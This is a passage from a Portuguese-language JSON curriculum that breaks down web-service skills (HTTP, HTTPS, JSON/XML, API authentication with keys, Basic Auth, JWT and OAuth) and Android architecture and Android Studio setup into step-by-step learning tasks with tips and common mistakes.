                                  "title": "Compreender os fundamentos do protocolo HTTP",
                                  "subSteps": [
                                    "Estudar a estrutura básica de uma requisição HTTP: método, URL, headers e body.",
                                    "Analisar a diferença entre HTTP (inseguro) e HTTPS (seguro com TLS/SSL).",
                                    "Explorar o ciclo de requisição-resposta em serviços web.",
                                    "Identificar componentes como headers (ex: Content-Type, Authorization).",
                                    "Revisar exemplos de requisições via ferramentas como curl ou browser devtools."
                                  ],
                                  "verification": "Listar corretamente os componentes de uma requisição HTTP e explicar a diferença entre HTTP e HTTPS.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre HTTP",
                                    "Browser com DevTools",
                                    "Ferramenta curl instalada"
                                  ],
                                  "tips": "Use o DevTools do navegador (F12) para inspecionar requisições reais em sites como google.com.",
                                  "learningObjective": "Entender a base do protocolo HTTP e sua evolução para HTTPS.",
                                  "commonMistakes": [
                                    "Confundir HTTP com HTML",
                                    "Ignorar a importância dos headers",
                                    "Achar que HTTPS é só um 'cadeado' no navegador"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar os métodos HTTP principais (GET, POST, PUT, DELETE)",
                                  "subSteps": [
                                    "Estudar GET: recuperação de dados, idempotente, sem body.",
                                    "Analisar POST: envio de dados, cria recursos, não idempotente.",
                                    "Explorar PUT: atualização completa de recurso, idempotente.",
                                    "Compreender DELETE: remoção de recurso, idempotente.",
                                    "Comparar usos em APIs RESTful com exemplos práticos."
                                  ],
                                  "verification": "Explicar com exemplos quando usar cada método e demonstrar em uma ferramenta.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Postman ou Insomnia",
                                    "API pública como JSONPlaceholder (jsonplaceholder.typicode.com)",
                                    "Documentação REST API"
                                  ],
                                  "tips": "Sempre teste idempotência: execute o método múltiplas vezes e veja se o resultado é o mesmo.",
                                  "learningObjective": "Selecionar e aplicar o método HTTP correto para operações CRUD em APIs.",
                                  "commonMistakes": [
                                    "Usar GET para enviar dados sensíveis",
                                    "Confundir PUT com PATCH (parcial)",
                                    "Ignorar idempotência em designs de API"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Entender e interpretar códigos de status HTTP",
                                  "subSteps": [
                                    "Memorizar 2xx (sucesso: 200 OK, 201 Created).",
                                    "Estudar 4xx (erros do cliente: 400 Bad Request, 404 Not Found).",
                                    "Analisar 5xx (erros do servidor: 500 Internal Server Error, 503 Service Unavailable).",
                                    "Explorar redirecionamentos 3xx (301, 302).",
                                    "Praticar identificando status em respostas de APIs reais."
                                  ],
                                  "verification": "Classificar 10 códigos de status em suas categorias e explicar 5 comuns.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Lista de códigos HTTP (MDN ou IETF)",
                                    "Postman com histórico de requisições",
                                    "Site httpstatus.io para testes"
                                  ],
                                  "tips": "Use ferramentas como httpstatus.io para ver respostas reais de diferentes códigos.",
                                  "learningObjective": "Interpretar status codes para depuração e tratamento de erros em aplicações.",
                                  "commonMistakes": [
                                    "Tratar todos 4xx como 'página não encontrada'",
                                    "Ignorar 429 Too Many Requests em APIs rate-limited",
                                    "Confundir 200 com 201"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar segurança com HTTPS em contextos de APIs",
                                  "subSteps": [
                                    "Explicar criptografia TLS/SSL e certificados digitais.",
                                    "Configurar requisições HTTPS em ferramentas de teste.",
                                    "Discutir ataques comuns (MITM) e por que HTTPS é essencial em APIs.",
                                    "Analisar headers de segurança (HSTS, CSP).",
                                    "Testar APIs em HTTP vs HTTPS e observar diferenças."
                                  ],
                                  "verification": "Realizar uma requisição HTTPS segura e explicar benefícios vs HTTP.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Postman com suporte HTTPS",
                                    "Site sslshopper.com para checar certificados",
                                    "Documentação Let's Encrypt"
                                  ],
                                  "tips": "Sempre verifique o cadeado e certificado em https://badssl.com para entender falhas.",
                                  "learningObjective": "Aplicar HTTPS para proteger dados em trânsito em serviços web.",
                                  "commonMistakes": [
                                    "Usar HTTP em produção para APIs sensíveis",
                                    "Ignorar certificados auto-assinados em dev",
                                    "Não validar certificados em código"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Postman, faça um GET em https://jsonplaceholder.typicode.com/posts/1 (esperado 200 OK), um POST para criar um post novo (201 Created), tente acessar um ID inexistente (404 Not Found) e force HTTP para ver aviso de segurança. Em seguida, integre em um script JavaScript com fetch() para consumir a API de forma segura.",
                              "finalVerifications": [
                                "Descrever corretamente os 4 métodos HTTP principais e seus usos.",
                                "Listar e explicar 5 status codes de diferentes famílias (2xx, 4xx, 5xx).",
                                "Explicar a diferença entre HTTP e HTTPS com foco em segurança.",
                                "Realizar 4 requisições (GET, POST, PUT, DELETE) em uma API pública via Postman.",
                                "Identificar headers de segurança em uma resposta HTTPS.",
                                "Tratar um erro 500 simulando em uma API de teste."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de métodos HTTP (mínimo 90% correto).",
                                "Correta classificação de status codes (acertar pelo menos 80%).",
                                "Demonstração prática de requisições HTTPS seguras.",
                                "Explicação clara de segurança TLS/SSL.",
                                "Identificação de erros comuns e idempotência.",
                                "Integração em código simples (ex: fetch JS)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos da camada de aplicação (TCP/IP).",
                                "Segurança da Informação: Criptografia assimétrica e certificados digitais.",
                                "Desenvolvimento Web: Integração frontend-backend com APIs REST.",
                                "Banco de Dados: Operações CRUD via APIs.",
                                "Administração de Sistemas: Configuração de servidores HTTPS com Nginx/Apache."
                              ],
                              "realWorldApplication": "Em um e-commerce, utilizar HTTPS com métodos POST/PUT para APIs de pagamento (ex: Stripe), garantindo que dados de cartão sejam transmitidos de forma criptografada, status codes sejam tratados para UX fluida (ex: 402 Payment Required) e depuração eficiente com logs de 4xx/5xx."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.5.1.1"
                            ]
                          },
                          {
                            "id": "10.1.1.5.3.2",
                            "name": "Trabalhar com JSON e XML",
                            "description": "Comparar formatos JSON (leve, legível) e XML (estruturado, verbose), demonstrando serialização e desserialização de dados em integrações de APIs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as diferenças entre JSON e XML",
                                  "subSteps": [
                                    "Estude a estrutura básica do JSON: pares chave-valor, arrays e objetos aninhados.",
                                    "Analise a estrutura do XML: tags de abertura/fechamento, atributos e namespaces.",
                                    "Compare legibilidade, tamanho de arquivo e suporte a tipos de dados entre os dois formatos.",
                                    "Identifique cenários de uso: JSON para APIs leves, XML para documentos estruturados.",
                                    "Crie exemplos simples de um mesmo dado em ambos os formatos."
                                  ],
                                  "verification": "Criar uma tabela comparativa com pelo menos 5 diferenças chave e apresentá-la.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code)",
                                    "Documentação oficial JSON.org e W3C XML",
                                    "Navegador web"
                                  ],
                                  "tips": "Use ferramentas online como JSONLint e XML Validator para validar exemplos.",
                                  "learningObjective": "Diferenciar características, vantagens e desvantagens de JSON e XML.",
                                  "commonMistakes": [
                                    "Confundir JSON com JavaScript (não é o mesmo)",
                                    "Ignorar namespaces no XML",
                                    "Subestimar o overhead de verbose do XML"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Serializar e desserializar dados em JSON",
                                  "subSteps": [
                                    "Crie um objeto JavaScript ou Python representando dados de um usuário (nome, email, idade).",
                                    "Use funções nativas (JSON.stringify em JS, json.dumps em Python) para serializar em string JSON.",
                                    "Salve o JSON em um arquivo e valide sua formatação.",
                                    "Desserialize a string JSON de volta para objeto usando JSON.parse ou json.loads.",
                                    "Teste manipulações como adicionar/remover propriedades no objeto."
                                  ],
                                  "verification": "Executar código que serializa e desserializa dados, exibindo antes/depois no console.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ambiente de programação (Node.js ou Python)",
                                    "Editor VS Code",
                                    "Console ou terminal"
                                  ],
                                  "tips": "Sempre trate erros de parsing com try-catch para JSON malformado.",
                                  "learningObjective": "Dominar conversão bidirecional entre objetos e strings JSON.",
                                  "commonMistakes": [
                                    "Esquecer aspas em chaves/strings",
                                    "Serializar funções ou undefined",
                                    "Não escapar caracteres especiais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Serializar e desserializar dados em XML",
                                  "subSteps": [
                                    "Defina um schema simples para dados de usuário usando tags XML.",
                                    "Use bibliotecas como xml.etree.ElementTree (Python) ou DOMParser (JS) para criar elementos XML.",
                                    "Converta objeto para XML (serialização) e salve em arquivo.",
                                    "Parse o XML de volta para objeto ou árvore DOM (desserialização).",
                                    "Valide o XML contra um schema básico com ferramentas online."
                                  ],
                                  "verification": "Gerar XML de um objeto, parsear de volta e confirmar que os dados coincidem.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Python com xml.etree ou JS com xml2js",
                                    "Editor VS Code",
                                    "Validador XML online"
                                  ],
                                  "tips": "Prefira bibliotecas para evitar erros manuais em tags aninhadas.",
                                  "learningObjective": "Manipular dados em formato XML de forma programática.",
                                  "commonMistakes": [
                                    "Fechar tags incorretamente",
                                    "Misturar atributos e elementos",
                                    "Ignorar encoding UTF-8"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar JSON e XML em integrações de APIs",
                                  "subSteps": [
                                    "Configure uma API mock (usando JSONPlaceholder ou Postman) que aceite JSON.",
                                    "Envie requisição POST com dados serializados em JSON e receba resposta.",
                                    "Repita com XML: converta dados para XML e teste em endpoint compatível.",
                                    "Compare tempos de resposta, tamanhos e legibilidade das respostas.",
                                    "Implemente um script que escolha formato baseado em header (Accept: application/json ou xml)."
                                  ],
                                  "verification": "Registrar logs de 4 requisições (2 JSON, 2 XML) com métricas de performance.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Postman ou Insomnia",
                                    "API pública como reqres.in",
                                    "Ambiente de programação"
                                  ],
                                  "tips": "Use headers Content-Type e Accept para controlar formatos.",
                                  "learningObjective": "Demonstrar uso prático em cenários de integração web.",
                                  "commonMistakes": [
                                    "Esquecer headers de Content-Type",
                                    "Não tratar respostas assíncronas",
                                    "Comparar sem normalizar dados"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um sistema de cadastro de usuários onde dados são serializados em JSON para uma API REST rápida, mas exportados em XML para relatórios legados em sistemas empresariais, comparando o tamanho dos payloads e tempo de processamento.",
                              "finalVerifications": [
                                "Explicar verbalmente 5 diferenças chave entre JSON e XML.",
                                "Serializar/desserializar um objeto complexo sem erros.",
                                "Enviar requisições API bem-sucedidas em ambos formatos.",
                                "Criar tabela comparativa de performance (tamanho/tempo).",
                                "Validar XML gerado contra schema simples.",
                                "Identificar quando usar cada formato em cenários reais."
                              ],
                              "assessmentCriteria": [
                                "Precisão na comparação de formatos (80% cobertura de diferenças).",
                                "Código funcional sem erros de sintaxe ou runtime.",
                                "Eficiência nas manipulações (tempo < estimado).",
                                "Validações corretas de JSON/XML.",
                                "Análise qualitativa/quantitativa em integrações API.",
                                "Clareza na documentação de exemplos."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Manipulação de estruturas de dados.",
                                "Banco de Dados: Exportação de dados em formatos interchangeáveis.",
                                "Redes: Protocolos HTTP e headers de conteúdo.",
                                "Desenvolvimento Web: Integração frontend-backend.",
                                "Gestão de Projetos: Escolha de formatos para escalabilidade."
                              ],
                              "realWorldApplication": "Em desenvolvimento de APIs para e-commerce, JSON é usado para trocas rápidas de catálogos de produtos, enquanto XML integra com sistemas legados de ERP para faturamento estruturado, otimizando performance e compatibilidade."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.3.3",
                            "name": "Implementar autenticação básica em serviços web",
                            "description": "Explicar mecanismos como API Keys, Basic Auth, OAuth 2.0 e JWT para autenticação e autorização em trocas de dados entre aplicações.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender e Configurar Autenticação com API Keys",
                                  "subSteps": [
                                    "Instalar Node.js e Express.js via npm para criar um servidor básico",
                                    "Criar uma lista estática de API keys válidas em uma variável de ambiente ou arquivo .env",
                                    "Desenvolver um middleware que verifica o header 'X-API-Key' em requisições",
                                    "Aplicar o middleware apenas em rotas protegidas, retornando 401 se inválido",
                                    "Testar a rota protegida com e sem key usando ferramentas como curl ou Postman"
                                  ],
                                  "verification": "Requisição com key válida retorna 200 OK; sem key ou inválida retorna 401 Unauthorized",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Node.js",
                                    "npm",
                                    "Postman ou curl",
                                    "Arquivo .env para secrets"
                                  ],
                                  "tips": "Use variáveis de ambiente para keys e nunca as commite no Git",
                                  "learningObjective": "Implementar autenticação stateless simples baseada em chaves compartilhadas",
                                  "commonMistakes": [
                                    "Armazenar keys em código fonte público",
                                    "Não sanitizar inputs de headers",
                                    "Esquecer de logar tentativas de acesso inválidas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Basic Authentication",
                                  "subSteps": [
                                    "Configurar um usuário e senha hardcoded ou em banco para testes (use bcrypt para hash)",
                                    "Criar middleware que decodifica o header 'Authorization: Basic <base64(user:pass)>'",
                                    "Verificar credenciais contra o hash armazenado e definir req.user se válido",
                                    "Proteger rotas específicas com esse middleware",
                                    "Testar com credenciais corretas e incorretas, verificando headers de resposta"
                                  ],
                                  "verification": "Acesso autorizado com credenciais corretas; 401 com incorretas ou ausentes",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "bcryptjs via npm",
                                    "Base64 decoder online para testes",
                                    "Postman com suporte a Basic Auth"
                                  ],
                                  "tips": "Sempre transmita sobre HTTPS em produção para evitar sniff de credenciais",
                                  "learningObjective": "Configurar autenticação baseada em usuário/senha com encoding base64",
                                  "commonMistakes": [
                                    "Não hashear senhas",
                                    "Aceitar credenciais sem HTTPS",
                                    "Expor senhas em logs"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Autenticação com JWT (JSON Web Tokens)",
                                  "subSteps": [
                                    "Instalar jsonwebtoken via npm e configurar uma secret key forte",
                                    "Criar endpoint /login que gera JWT ao validar credenciais",
                                    "Desenvolver middleware que verifica JWT no header 'Authorization: Bearer <token>'",
                                    "Incluir payload no token (ex: userId, expiração) e validar assinatura/expiração",
                                    "Testar fluxo completo: login -> token -> acesso protegido -> refresh/expiração"
                                  ],
                                  "verification": "Token válido permite acesso; expirado ou inválido retorna 401",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "jsonwebtoken npm",
                                    "Documentação JWT.io",
                                    "Postman para fluxos de auth"
                                  ],
                                  "tips": "Defina expiração curta (15-60min) e use refresh tokens para sessões longas",
                                  "learningObjective": "Gerar e validar tokens assinados para autenticação stateless escalável",
                                  "commonMistakes": [
                                    "Secret key fraca ou exposta",
                                    "Não validar 'exp' e 'iat'",
                                    "Tokens sem HTTPS"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Introduzir OAuth 2.0 e Testar Integrações",
                                  "subSteps": [
                                    "Estudar fluxos OAuth 2.0 (Authorization Code, Client Credentials) via docs oficiais",
                                    "Configurar um provedor mock como Auth0 ou usar Google OAuth para testes",
                                    "Implementar endpoint que troca code por access token e o usa em chamadas API",
                                    "Integrar OAuth em uma rota existente, verificando scopes e token validity",
                                    "Testar fluxo end-to-end com redirecionamentos e callbacks"
                                  ],
                                  "verification": "Fluxo OAuth completa autenticação e autoriza acesso com scopes corretos",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Auth0 ou Google Developer Console",
                                    "RFC 6749 OAuth 2.0",
                                    "ngrok para callbacks locais"
                                  ],
                                  "tips": "Comece com Client Credentials para machine-to-machine; evite Implicit flow por segurança",
                                  "learningObjective": "Integrar OAuth 2.0 para autenticação delegada em serviços third-party",
                                  "commonMistakes": [
                                    "Ignorar CSRF em callbacks",
                                    "Não validar issuer/audience no token",
                                    "Armazenar tokens inseguros"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Debugar e Aplicar Melhores Práticas de Segurança",
                                  "subSteps": [
                                    "Usar ferramentas como OWASP ZAP ou Burp Suite para testar vulnerabilidades comuns",
                                    "Implementar rate limiting em endpoints de auth para prevenir brute force",
                                    "Adicionar logging de acessos e erros sem expor dados sensíveis",
                                    "Configurar CORS apenas para origens confiáveis em APIs autenticadas",
                                    "Realizar testes de integração entre todos os métodos implementados"
                                  ],
                                  "verification": "Nenhum teste de segurança falha; logs mostram acessos corretos",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "OWASP ZAP gratuito",
                                    "express-rate-limit npm",
                                    "Helmet.js para headers de segurança"
                                  ],
                                  "tips": "Audite dependências com npm audit e use HTTPS everywhere",
                                  "learningObjective": "Garantir implementação segura e robusta contra ataques comuns",
                                  "commonMistakes": [
                                    "Sem rate limiting",
                                    "CORS wildcard (*)",
                                    "Logs com senhas ou tokens"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie uma API REST para um serviço de gerenciamento de usuários onde: API Keys protegem rotas de listagem, Basic Auth para login inicial, JWT para sessões ativas e OAuth para integração com Google Sign-In, testando com Postman Collections.",
                              "finalVerifications": [
                                "Todas as rotas protegidas rejeitam acessos não autorizados",
                                "Tokens JWT expiram corretamente e podem ser invalidados",
                                "Fluxo OAuth completa sem erros de redirecionamento",
                                "Logs capturam tentativas maliciosas sem vazar dados",
                                "Testes unitários cobrem middlewares de auth",
                                "HTTPS é enforced em produção simulado"
                              ],
                              "assessmentCriteria": [
                                "Código modular com middlewares reutilizáveis",
                                "Tratamento completo de erros HTTP (401, 403)",
                                "Uso correto de hashing e secrets em env vars",
                                "Testes automatizados com 80%+ cobertura em auth",
                                "Documentação de endpoints com exemplos de headers",
                                "Conformidade com OWASP Top 10 basics"
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação (criptografia e ameaças web)",
                                "Desenvolvimento de Software (design de APIs REST)",
                                "Redes de Computadores (headers HTTP e protocolos)",
                                "Banco de Dados (armazenamento seguro de credenciais)",
                                "Ética e Governança (GDPR compliance em auth)"
                              ],
                              "realWorldApplication": "Em plataformas como Stripe (API Keys para pagamentos), GitHub (Basic Auth e OAuth para integrações CI/CD) e apps bancários (JWT + OAuth para mobile APIs seguras), garantindo trocas de dados autorizadas entre serviços."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.5.2.1"
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.2",
                "name": "Desenvolvimento de aplicações móveis",
                "description": "Explora técnicas e ferramentas para criar aplicativos que funcionam em dispositivos móveis.",
                "totalSkills": 48,
                "atomicTopics": [
                  {
                    "id": "10.1.2.1",
                    "name": "Plataformas de Desenvolvimento Móvel",
                    "description": "Introdução às plataformas Android e iOS, incluindo ferramentas como Android Studio e Xcode.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.1.1",
                        "name": "Plataforma Android",
                        "description": "Introdução à plataforma Android, incluindo sua arquitetura baseada em Linux, componentes principais como Activities, Services e Broadcast Receivers, e a ferramenta oficial Android Studio para desenvolvimento de aplicativos nativos.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.1.1",
                            "name": "Compreender a Arquitetura Android",
                            "description": "Explicar as camadas da arquitetura Android, incluindo Kernel Linux, bibliotecas nativas (HAL), runtime ART, framework de aplicações e aplicações, destacando como elas suportam o desenvolvimento multiplataforma.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Overview Geral da Arquitetura Android",
                                  "subSteps": [
                                    "Pesquise diagramas oficiais da arquitetura Android no site developer.android.com",
                                    "Identifique as quatro camadas principais: Kernel Linux, Bibliotecas Nativas (HAL), Runtime ART e Framework de Aplicações/Aplicações",
                                    "Anote as responsabilidades básicas de cada camada em um mapa mental",
                                    "Compare com arquiteturas de outras plataformas como iOS para destacar diferenças",
                                    "Resuma em 3-5 frases o fluxo de dados de uma app até o hardware"
                                  ],
                                  "verification": "Crie um diagrama simples das camadas e explique oralmente ou por escrito o fluxo geral",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Acesso à internet, site developer.android.com, ferramenta de diagramação como Draw.io ou papel e caneta",
                                  "tips": "Use cores diferentes para cada camada no diagrama para facilitar a visualização",
                                  "learningObjective": "Compreender a estrutura hierárquica da arquitetura Android e seu fluxo de abstração",
                                  "commonMistakes": "Confundir HAL com bibliotecas de apps; ignorar que o Kernel é baseado em Linux"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar as Camadas Inferiores: Kernel Linux e HAL",
                                  "subSteps": [
                                    "Estude o Kernel Linux: drivers de hardware, gerenciamento de memória e processos",
                                    "Analise o HAL (Hardware Abstraction Layer): como abstrai hardware específico para o framework",
                                    "Leia documentação sobre como o Kernel interage com HAL em cenários como câmera ou sensores",
                                    "Instale Android Studio e examine logs de kernel via ADB para ver interações reais",
                                    "Liste 3 exemplos de hardware suportados via HAL (ex: GPS, Bluetooth)"
                                  ],
                                  "verification": "Explique em um parágrafo como uma chamada de câmera app alcança o hardware via HAL",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Android Studio, dispositivo Android ou emulador, ADB tool, documentação HAL no AOSP",
                                  "tips": "Use comandos ADB logcat para filtrar logs de kernel e HAL durante testes",
                                  "learningObjective": "Dominar como as camadas inferiores gerenciam hardware de forma abstraída",
                                  "commonMistakes": "Achar que HAL é exclusivo do Android; subestimar o papel do Kernel em segurança"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Camadas Médias: Runtime ART e Framework de Aplicações",
                                  "subSteps": [
                                    "Compare Dalvik vs ART: entenda compilação AOT e otimização de apps",
                                    "Explore componentes do Framework: ActivityManager, PackageManager, View System",
                                    "Desenvolva um app simples que use intents e services para ver framework em ação",
                                    "Estude como ART gerencia garbage collection e multithreading",
                                    "Documente interações entre ART e Framework em um fluxograma"
                                  ],
                                  "verification": "Execute um app de teste e descreva o ciclo de vida de uma Activity via logs",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Android Studio, emulador Android, código-fonte de app exemplo do Android docs",
                                  "tips": "Ative modo developer no emulador para monitorar ART com perfis de bateria",
                                  "learningObjective": "Compreender execução de apps e serviços fornecidos pelo framework",
                                  "commonMistakes": "Confundir ART com JVM Java; ignorar serviços como Binder para IPC"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Camadas Superiores e Suporte Multiplataforma",
                                  "subSteps": [
                                    "Examine como apps (APKs) interagem com o framework via APIs públicas",
                                    "Discuta suporte multiplataforma: bibliotecas como Flutter/React Native sobre Android",
                                    "Crie um exemplo de app híbrido usando Kotlin e uma lib cross-platform",
                                    "Avalie limitações: acesso nativo vs abstrações cross-platform",
                                    "Resuma benefícios da arquitetura para devs multiplataforma em relatório"
                                  ],
                                  "verification": "Desenvolva e rode um app simples que demonstre chamadas cross-layer",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Android Studio, Flutter SDK opcional, dispositivo para teste real",
                                  "tips": "Teste em múltiplos devices para ver HAL em ação com hardware variado",
                                  "learningObjective": "Explicar como a arquitetura facilita desenvolvimento multiplataforma",
                                  "commonMistakes": "Acreditar que cross-platform ignora arquitetura nativa; superestimar portabilidade total"
                                }
                              ],
                              "practicalExample": "Desenvolva um app de câmera simples: a UI (aplicações) chama Camera API (framework), que usa ART para execução, HAL para abstrair sensores e Kernel para acesso direto ao hardware da câmera, demonstrando o fluxo completo.",
                              "finalVerifications": [
                                "Desenhe e rotule corretamente um diagrama da arquitetura Android com 4 camadas",
                                "Explique o caminho de uma intent de app até o hardware em 5 passos",
                                "Identifique 3 diferenças entre ART e Dalvik com exemplos",
                                "Liste 2 limitações do HAL em cenários cross-platform",
                                "Compare arquitetura Android com iOS em um quadro de 4 colunas",
                                "Execute logs ADB mostrando interações kernel-framework"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e descrição das 4 camadas principais (90%+ acurácia)",
                                "Profundidade nos fluxos de interação entre camadas com exemplos concretos",
                                "Completude do diagrama e fluxogramas com labels claros",
                                "Capacidade de relacionar arquitetura a desenvolvimento multiplataforma",
                                "Identificação correta de erros comuns e dicas práticas aplicadas",
                                "Demonstração prática via app ou logs sem falhas críticas"
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Kernel Linux e gerenciamento de processos",
                                "Programação: Conceitos de runtime (ART) e garbage collection em Java/Kotlin",
                                "Engenharia de Software: Abstrações e camadas em arquiteturas modulares",
                                "Redes e Segurança: IPC via Binder e permissões no framework"
                              ],
                              "realWorldApplication": "Em empresas como Google ou WhatsApp, entender a arquitetura permite otimizar apps para bateria (via ART), suportar novos hardwares (HAL) e integrar libs cross-platform como React Native, reduzindo tempo de desenvolvimento em 30-50% para equipes multiplataforma."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.1.2",
                            "name": "Instalar e Configurar Android Studio",
                            "description": "Realizar a instalação do Android Studio, configurar o SDK, AVD (Android Virtual Device) e emuladores, além de integrar ferramentas como Gradle para gerenciamento de dependências.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Baixar e Instalar o Android Studio",
                                  "subSteps": [
                                    "Verifique os requisitos mínimos do sistema (8GB RAM, Java JDK 11+ instalado).",
                                    "Acesse o site oficial do Android Studio (developer.android.com/studio).",
                                    "Baixe a versão mais recente para o seu SO (Windows, macOS ou Linux).",
                                    "Execute o instalador e siga o assistente de instalação, selecionando todas as opções padrão.",
                                    "Reinicie o computador se solicitado pelo instalador."
                                  ],
                                  "verification": "Android Studio aparece no menu de aplicativos ou desktop sem erros de instalação.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Computador com pelo menos 8GB RAM",
                                    "Conexão à internet estável",
                                    "Espaço em disco: 8GB+"
                                  ],
                                  "tips": "Use o instalador oficial para evitar versões corrompidas; desative antivírus temporariamente se houver bloqueios.",
                                  "learningObjective": "Entender o processo de download e instalação segura de ferramentas de desenvolvimento.",
                                  "commonMistakes": [
                                    "Baixar de fontes não oficiais (risco de malware)",
                                    "Ignorar requisitos de RAM levando a lentidão",
                                    "Não reiniciar após instalação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar pela Primeira Vez e Configurar Ambiente Inicial",
                                  "subSteps": [
                                    "Abra o Android Studio e complete o setup wizard (importar configurações ou usar padrão).",
                                    "Selecione 'Standard' installation e prossiga para download de componentes essenciais.",
                                    "Aguarde o download do Android SDK, HAXM (para aceleração de emulador) e outros.",
                                    "Aceite licenças e configure o tema (Light/Dark) e plugins iniciais.",
                                    "Clique em 'Finish' para acessar a tela de boas-vindas."
                                  ],
                                  "verification": "Tela de boas-vindas do Android Studio carrega sem erros e componentes estão listados como instalados.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Android Studio instalado",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Mantenha a conexão estável durante downloads; escolha 'Standard' para iniciantes.",
                                  "learningObjective": "Familiarizar-se com o wizard de setup e componentes iniciais do IDE.",
                                  "commonMistakes": [
                                    "Interromper downloads parciais",
                                    "Não aceitar todas as licenças",
                                    "Escolher configurações custom sem necessidade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar o Android SDK via SDK Manager",
                                  "subSteps": [
                                    "No Android Studio, vá em File > Settings > Appearance & Behavior > System Settings > Android SDK.",
                                    "Na aba 'SDK Platforms', selecione Android API levels recentes (ex: API 33+).",
                                    "Na aba 'SDK Tools', marque Android SDK Build-Tools, Platform-Tools, Emulator e Google USB Driver.",
                                    "Clique em 'Apply' para instalar/atualizar.",
                                    "Verifique a pasta SDK (geralmente em ~/Android/Sdk) e anote o caminho."
                                  ],
                                  "verification": "SDK Manager mostra todos os componentes como 'Installed' sem erros vermelhos.",
                                  "estimatedTime": "10-20 minutos",
                                  "materials": [
                                    "Android Studio aberto"
                                  ],
                                  "tips": "Instale múltiplos API levels para compatibilidade futura; use mirror se download lento.",
                                  "learningObjective": "Dominar a gestão de SDKs para suporte a diferentes versões Android.",
                                  "commonMistakes": [
                                    "Instalar apenas um API level",
                                    "Ignorar SDK Tools essenciais",
                                    "Usar caminhos com espaços no nome"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar e Configurar AVD (Android Virtual Device)",
                                  "subSteps": [
                                    "Vá em Tools > AVD Manager.",
                                    "Clique 'Create Virtual Device', selecione hardware (ex: Pixel 4).",
                                    "Escolha system image (ex: API 33, Google APIs Intel x86_64 Atom).",
                                    "Configure AVD: nome 'MeuEmulador', habilite aceleração de hardware (HAXM).",
                                    "Finalize e inicie o emulador para teste rápido (deve bootar em <2min)."
                                  ],
                                  "verification": "Emulador inicia, mostra tela inicial Android e roda sem crash.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "SDK instalado",
                                    "HAXM ou Hypervisor Framework ativado"
                                  ],
                                  "tips": "Ative VT-x/AMD-V no BIOS para aceleração; use imagens x86 para performance.",
                                  "learningObjective": "Configurar emuladores virtuais para testes sem dispositivo físico.",
                                  "commonMistakes": [
                                    "Não habilitar aceleração de hardware (emulador lento)",
                                    "Selecionar ARM images em PCs x86",
